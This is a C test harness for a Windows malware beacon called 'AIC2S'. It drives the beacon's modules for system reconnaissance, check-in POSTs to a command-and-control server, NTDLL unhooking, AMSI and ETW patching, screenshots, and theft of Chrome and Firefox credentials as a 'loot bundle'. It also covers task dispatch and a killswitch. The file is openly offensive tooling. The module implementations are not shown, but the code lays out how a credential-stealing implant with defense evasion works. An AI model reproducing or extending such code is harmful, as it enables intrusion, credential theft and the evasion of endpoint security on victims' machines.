// src/test_main.c — local test harness, no C2 needed
// Build target: beacon_test (see CMakeLists.txt)
// Compile flag: BEACON_TEST

#include "anti_analysis.h"
#include "common.h"
#include "comms.h"
#include "crypto.h"
#include "evasion.h"
#include "killswitch.h"
#include "postex.h"
#include "recon.h"
// ============================================================
// COMMS TEST — call this explicitly
// ============================================================
static BOOL test_comms(void) {
  printf("\n=== COMMS TEST ===\n");

  // step 1: connection check
  printf("[*] Step 1: checking_connection...\n");
  BOOL connected = FALSE;
  checking_connection(&connected);
  printf("[*] Connection result: %s\n", connected ? "OK" : "FAILED");
  if (!connected) {
    printf("[!] Cannot reach C2 at %S:%d\n", C2_HOST, C2_PORT);
    printf("[!] Is the listener running? Firewall open?\n");
    return FALSE;
  }

  // step 2: collect recon
  printf("[*] Step 2: collecting recon...\n");
  CHECKIN_INFO info = {0};
  recon_collect(&info);
  recon_print(&info);

  // step 3: serialize
  CHAR *json = NULL;
  DWORD jsonLen = 0;
  recon_serialize(&info, &json, &jsonLen);
  printf("[*] Step 3: JSON (%lu bytes):\n%s\n", jsonLen, json);

  // step 4: POST to C2
  printf("[*] Step 4: beacon_post...\n");
  BYTE *response = NULL;
  DWORD respLen = 0;
  BOOL posted = beacon_post((BYTE *)json, jsonLen, &response, &respLen);
  printf("[*] beacon_post returned: %s\n", posted ? "TRUE" : "FALSE");

  if (response && respLen > 0) {
    printf("[+] C2 response (%lu bytes):\n%.*s\n", respLen, respLen,
           (char *)response);
    HeapFree(GetProcessHeap(), 0, response);
  } else {
    printf("[!] No response body from C2\n");
  }

  HeapFree(GetProcessHeap(), 0, json);
  return posted;
}

int main() {
  printf("=== AIC2S BEACON LOCAL TEST ===\n\n");
#ifdef BEACON_TEST
#pragma message("BEACON_TEST is defined — cert bypass enabled")
#else
#pragma message("BEACON_TEST is NOT defined — cert bypass DISABLED")
#endif

  int passed = 0, failed = 0, skipped = 0;

  // ── Test 1: Recon ─────────────────────────────────────────
  printf("[TEST 1] Recon\n");
  CHECKIN_INFO info = {0};
  recon_collect(&info);
  recon_print(&info);

  CHAR *json = NULL;
  DWORD len = 0;
  recon_serialize(&info, &json, &len);
  printf("[TEST 1] JSON (%lu bytes):\n%s\n\n", len, json);
  HeapFree(GetProcessHeap(), 0, json);
  passed++;

  // ── Test 2: Anti-analysis ─────────────────────────────────
  printf("[TEST 2] Anti-analysis (SKIPPED ExitProcess in test mode)\n");
  anti_analysis_run(FALSE);
  passed++;

  // ── Test 3: Evasion ───────────────────────────────────────
  printf("[TEST 3] NTDLL unhook\n");
  if (!unhook_ntdll())
    printf("[!] unhook_ntdll failed\n");

  printf("[TEST 3] AMSI patch\n");
  patch_amsi();

  printf("[TEST 3] ETW patch\n");
  patch_etw();
  passed++;

  // ── Test 4: Screenshot ────────────────────────────────────
  printf("\n[TEST 4] Screenshot\n");
  postex_run("screenshot");
  passed++;

  // ── Test 5: Browser file collection ──────────────────────
  printf("\n[TEST 5] Browser file collection\n");
  postex_run("grab_creds");
  passed++;

  // ── Test 6: Dispatch with fake whoami task ────────────────
  printf("\n[TEST 6] dispatch_task with fake whoami task\n");
  const CHAR *fakeTask =
      "{\"id\":\"test-001\",\"command\":\"whoami\",\"args\":null}";
  printf("  Fake task JSON: %s\n", fakeTask);
  dispatch_task((BYTE *)fakeTask, (DWORD)strlen(fakeTask));
  passed++;

  // ── Test 7: Killswitch ────────────────────────────────────
  printf("\n[TEST 7] killswitch\n");
  printf("  soft kill active: %s\n", killswitch_is_active() ? "YES" : "NO");
  killswitch_soft();
  printf("[!] KILLSWITCH: soft kill — beacon going dormant\n");
  printf("  after killswitch_soft: %s\n",
         killswitch_is_active() ? "YES" : "NO");
  passed++;

  // ── Test 8: AES roundtrip ────────────────────────────────
  printf("\n[TEST 8] AES roundtrip\n");
  const CHAR *plaintext = "AIC2S beacon test!";
  PVOID pCipher = NULL;
  DWORD cipherLen = 0;
  PVOID pDecrypt = NULL;
  DWORD decryptLen = 0;

  if (aes_encrypt_payload((PBYTE)plaintext, (DWORD)strlen(plaintext), &pCipher,
                          &cipherLen)) {
    printf("  Encrypted: %lu bytes\n", cipherLen);
    if (aes_decrypt_payload((PBYTE)pCipher, cipherLen, &pDecrypt,
                            &decryptLen)) {
      printf("  Decrypted: %.*s\n", decryptLen, (CHAR *)pDecrypt);
      printf("  Match: %s\n",
             memcmp(pDecrypt, plaintext, strlen(plaintext)) == 0 ? "PASS"
                                                                 : "FAIL");
      HeapFree(GetProcessHeap(), 0, pDecrypt);
    }
    HeapFree(GetProcessHeap(), 0, pCipher);
  } else {
    printf("[!] aes_encrypt_payload failed\n");
  }
  passed++;

  // ============================================================
  // NEW TEST CASES — Browser, NTDLL, Evasion
  // ============================================================

  // ── Test 10: Chrome present ───────────────────────────────
  printf("\n[TEST 10] Chrome credential grab — files present\n");
  if (test_postex_chrome_present()) passed++; else failed++;

  // ── Test 11: Chrome missing ───────────────────────────────
  printf("\n[TEST 11] Chrome credential grab — files missing\n");
  if (test_postex_chrome_missing()) passed++; else failed++;

  // ── Test 12: Firefox present ──────────────────────────────
  printf("\n[TEST 12] Firefox credential grab — profiles present\n");
  if (test_postex_firefox_present()) passed++; else failed++;

  // ── Test 13: Firefox missing ──────────────────────────────
  printf("\n[TEST 13] Firefox credential grab — profiles missing\n");
  if (test_postex_firefox_missing()) passed++; else failed++;

  // ── Test 14: Bundle serialization ─────────────────────────
  printf("\n[TEST 14] Loot bundle JSON serialization\n");
  if (test_postex_serialize_bundle()) passed++; else failed++;

  // ── Test 15: Screenshot capture ───────────────────────────
  printf("\n[TEST 15] Screenshot capture + BMP validation\n");
  if (test_postex_screenshot()) passed++; else failed++;

  // ── Test 16: NTDLL map from disk ──────────────────────────
  printf("\n[TEST 16] NTDLL — map clean copy from disk\n");
  if (test_ntdll_map_from_disk()) passed++; else failed++;

  // ── Test 17: NTDLL fetch local base ───────────────────────
  printf("\n[TEST 17] NTDLL — fetch local (hooked) base address\n");
  if (test_ntdll_fetch_local_base()) passed++; else failed++;

  // ── Test 18: NTDLL .text replacement ──────────────────────
  printf("\n[TEST 18] NTDLL — .text section replacement\n");
  if (test_ntdll_replace_text()) passed++; else failed++;

  // ── Test 19: NTDLL full unhook ────────────────────────────
  printf("\n[TEST 19] NTDLL — full unhook pipeline\n");
  if (test_ntdll_unhook_success()) passed++; else failed++;

  // ── Test 20: AMSI patch success ───────────────────────────
  printf("\n[TEST 20] AMSI patch\n");
  if (test_amsi_patch_success()) passed++; else failed++;

  // ── Test 21: AMSI not loaded ──────────────────────────────
  printf("\n[TEST 21] AMSI — not loaded graceful handling\n");
  if (test_amsi_not_loaded()) passed++; else failed++;

  // ── Test 22: ETW patch ────────────────────────────────────
  printf("\n[TEST 22] ETW patch\n");
  if (test_etw_patch_success()) passed++; else failed++;

  // ── Test 23: Full evasion pipeline ────────────────────────
  printf("\n[TEST 23] Full evasion pipeline (unhook + AMSI + ETW)\n");
  if (test_evasion_full_pipeline()) passed++; else failed++;

  // ── Summary ───────────────────────────────────────────────
  printf("\n========================================\n");
  printf("  TEST SUMMARY\n");
  printf("========================================\n");
  printf("  Passed:  %d\n", passed);
  printf("  Failed:  %d\n", failed);
  printf("  Total:   %d\n", passed + failed);
  printf("========================================\n");

  printf("\n=== TEST 9: COMMS ===\n");
  if (test_comms()) {
    printf("[+] COMMS: PASS\n");
  } else {
    printf("[!] COMMS: FAIL\n");
  }

  printf("\n=== ALL TESTS COMPLETE ===\n");
  return (failed > 0) ? 1 : 0;
}